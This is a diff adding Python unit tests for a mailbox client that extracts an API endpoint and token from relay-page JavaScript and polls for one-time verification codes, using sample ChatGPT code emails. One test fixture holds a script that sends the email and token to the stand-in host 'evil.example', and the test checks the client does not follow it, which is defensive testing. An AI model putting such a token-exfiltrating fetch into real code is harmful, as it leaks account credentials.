@@ -3,7 +3,7 @@ import imaplib
 import json
 import unittest
 from datetime import datetime, timedelta, timezone
-from urllib.parse import quote
+from urllib.parse import parse_qs, quote, urlsplit
 from unittest import mock
 
 from sqlalchemy.pool import StaticPool
@@ -1644,6 +1644,214 @@ class OutlookMailboxOAuthTests(unittest.TestCase):
         )
 
         self.assertEqual(urls, [])
+
+    @mock.patch("requests.get")
+    def test_mailapi_javascript_shell_fetches_structured_latest_code(
+        self,
+        mock_get,
+    ):
+        mailbox = OutlookMailbox()
+        account = MailboxAccount(
+            email="demo@xeramail.com",
+            extra={
+                "account_type": "mailapi_url",
+                "mailapi_url": (
+                    "https://relay.example.test/m/demo%40xeramail.com"
+                    "?token=share-token"
+                ),
+            },
+        )
+        shell = """
+        <html><body><div id="list"></div><script>
+        const email="demo@xeramail.com";
+        const token="relay-secret";
+        async function load(force) {
+          const api='/api/messages?email='+encodeURIComponent(email)
+            +'&token='+encodeURIComponent(token)
+            +(force?'&force=1&t='+Date.now():'');
+          const response=await fetch(api,{cache:'no-store'});
+          return response.json();
+        }
+        load(true);
+        </script></body></html>
+        """
+        old_payload = {
+            "ok": True,
+            "email": account.email,
+            "messages": [
+                {
+                    "id": "old-message",
+                    "subject": "Your ChatGPT verification code",
+                    "receivedAt": "2026-08-24T11:28:20.000Z",
+                    "codes": ["111111"],
+                    "bodyText": "Use the code shown above.",
+                }
+            ],
+        }
+        new_payload = {
+            "ok": True,
+            "email": account.email,
+            "messages": [
+                {
+                    "id": "new-message",
+                    "subject": "Your ChatGPT verification code",
+                    "receivedAt": "2026-08-24T11:28:25.353Z",
+                    "otp": "222222",
+                    "bodyText": "Use the code shown above.",
+                },
+                *old_payload["messages"],
+            ],
+        }
+        mock_get.side_effect = [
+            _FakeResponse(200, text=shell),
+            _FakeResponse(200, text=json.dumps(old_payload)),
+            _FakeResponse(200, text=shell),
+            _FakeResponse(200, text=json.dumps(new_payload)),
+        ]
+
+        before_ids = mailbox.get_current_ids(account)
+        otp_sent_at = datetime.fromisoformat(
+            "2026-08-24T11:28:23+00:00"
+        ).timestamp()
+        with mock.patch.object(
+            mailbox,
+            "_run_polling_wait",
+            side_effect=lambda **kwargs: kwargs["poll_once"](),
+        ):
+            code = mailbox.wait_for_code(
+                account,
+                timeout=5,
+                before_ids=before_ids,
+                otp_sent_at=otp_sent_at,
+            )
+
+        self.assertEqual(code, "222222")
+        self.assertEqual(len(before_ids), 1)
+        self.assertEqual(mock_get.call_count, 4)
+        for index in (1, 3):
+            api_url = mock_get.call_args_list[index].args[0]
+            parsed = urlsplit(api_url)
+            self.assertEqual(parsed.netloc, "relay.example.test")
+            self.assertEqual(parsed.path, "/api/messages")
+            query = parse_qs(parsed.query)
+            self.assertEqual(query["email"], [account.email])
+            self.assertEqual(query["token"], ["relay-secret"])
+            self.assertEqual(query["force"], ["1"])
+
+    @mock.patch("requests.get")
+    def test_mailapi_javascript_shell_rejects_mismatched_email(
+        self,
+        mock_get,
+    ):
+        mailbox = OutlookMailbox()
+        account = MailboxAccount(
+            email="expected@xeramail.com",
+            extra={
+                "account_type": "mailapi_url",
+                "mailapi_url": "https://relay.example.test/m/expected",
+            },
+        )
+        mock_get.return_value = _FakeResponse(
+            200,
+            text="""
+            <script>
+              const email="other@xeramail.com";
+              const token="relay-secret";
+              const api='/api/messages?email='+encodeURIComponent(email)
+                +'&token='+encodeURIComponent(token);
+              fetch(api);
+            </script>
+            """,
+        )
+
+        with mock.patch.object(
+            mailbox,
+            "_run_polling_wait",
+            side_effect=lambda **kwargs: kwargs["poll_once"](),
+        ):
+            self.assertIsNone(mailbox.wait_for_code(account, timeout=5))
+        self.assertEqual(mock_get.call_count, 1)
+
+    @mock.patch("requests.get")
+    def test_mailapi_javascript_shell_does_not_follow_cross_origin_endpoint(
+        self,
+        mock_get,
+    ):
+        mailbox = OutlookMailbox()
+        account = MailboxAccount(
+            email="expected@xeramail.com",
+            extra={
+                "account_type": "mailapi_url",
+                "mailapi_url": "https://relay.example.test/m/expected",
+            },
+        )
+        mock_get.return_value = _FakeResponse(
+            200,
+            text="""
+            <script>
+              const email="expected@xeramail.com";
+              const token="relay-secret";
+              const api='https://evil.example/api/messages?email='
+                +encodeURIComponent(email)+'&token='+encodeURIComponent(token);
+              fetch(api);
+            </script>
+            """,
+        )
+
+        with mock.patch.object(
+            mailbox,
+            "_run_polling_wait",
+            side_effect=lambda **kwargs: kwargs["poll_once"](),
+        ):
+            self.assertIsNone(mailbox.wait_for_code(account, timeout=5))
+        self.assertEqual(mock_get.call_count, 1)
+
+    @mock.patch("requests.get")
+    def test_mailapi_javascript_shell_rejects_api_payload_for_other_email(
+        self,
+        mock_get,
+    ):
+        mailbox = OutlookMailbox()
+        account = MailboxAccount(
+            email="expected@xeramail.com",
+            extra={
+                "account_type": "mailapi_url",
+                "mailapi_url": "https://relay.example.test/m/expected",
+            },
+        )
+        shell = """
+        <script>
+          const email="expected@xeramail.com";
+          const token="relay-secret";
+          const api='/api/messages?email='+encodeURIComponent(email)
+            +'&token='+encodeURIComponent(token);
+          fetch(api);
+        </script>
+        """
+        payload = {
+            "ok": True,
+            "email": "other@xeramail.com",
+            "messages": [
+                {
+                    "id": "other-message",
+                    "subject": "Your ChatGPT verification code",
+                    "receivedAt": "2026-08-24T11:28:25.353Z",
+                    "otp": "222222",
+                }
+            ],
+        }
+        mock_get.side_effect = [
+            _FakeResponse(200, text=shell),
+            _FakeResponse(200, text=json.dumps(payload)),
+        ]
+
+        with mock.patch.object(
+            mailbox,
+            "_run_polling_wait",
+            side_effect=lambda **kwargs: kwargs["poll_once"](),
+        ):
+            self.assertIsNone(mailbox.wait_for_code(account, timeout=5))
+        self.assertEqual(mock_get.call_count, 2)
 
     @mock.patch("requests.get")
     def test_mailapi_detail_without_code_falls_back_to_original_page(self, mock_get):
